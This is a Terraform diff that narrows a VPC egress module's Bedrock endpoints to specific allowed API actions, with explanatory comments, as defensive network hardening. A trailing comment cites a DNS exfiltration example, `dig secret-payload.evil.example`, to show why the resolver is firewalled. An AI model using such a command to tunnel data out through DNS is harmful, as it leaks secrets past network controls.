@@ -60,6 +60,34 @@ module "egress" {
   core_services  = ["sts", "logs", "kms", "glue", "lakeformation", "athena"]
   extra_services = ["sagemaker.api", "secretsmanager", "datazone"]
 
+  # Per apply, from `make up ENV=staging ONLY=egress GROUPS=…` (variables.tf): `bedrock-base` for a
+  # sitting that runs app-genai (Stage 17 step 10.6), nothing otherwise.
+  optional_service_groups = var.optional_service_groups
+
+  # The doors of the `bedrock-base` group, narrowed to what app-genai's tasks call (Stage 17 step 10.5),
+  # binding only in an apply whose groups create the endpoints: Converse, authorized as
+  # bedrock:InvokeModel, through `bedrock-runtime`, and the `guardrail` task's seven calls through
+  # `bedrock`, read in Sandbox on 2026-11-22 (10.4). bedrock:ApplyGuardrail stands beside the invoke for
+  # the account's enforced guardrail: whether the service asks it of the caller is verification l,
+  # unanswered, and the boundary and the role's statements grant it for the same reason (studio/'s
+  # genai.tf). A call absent from a list traverses no endpoint, whatever IAM allows, and nothing else in
+  # this VPC calls Bedrock. A change joins both slices.
+  endpoint_action_scopes = {
+    "bedrock-runtime" = [
+      "bedrock:ApplyGuardrail",
+      "bedrock:InvokeModel",
+    ]
+    "bedrock" = [
+      "bedrock:CreateGuardrail",
+      "bedrock:CreateGuardrailVersion",
+      "bedrock:GetGuardrail",
+      "bedrock:ListGuardrails",
+      "bedrock:ListTagsForResource",
+      "bedrock:TagResource",
+      "bedrock:UpdateGuardrail",
+    ]
+  }
+
   # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
   # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through the
   # resolver one label at a time.
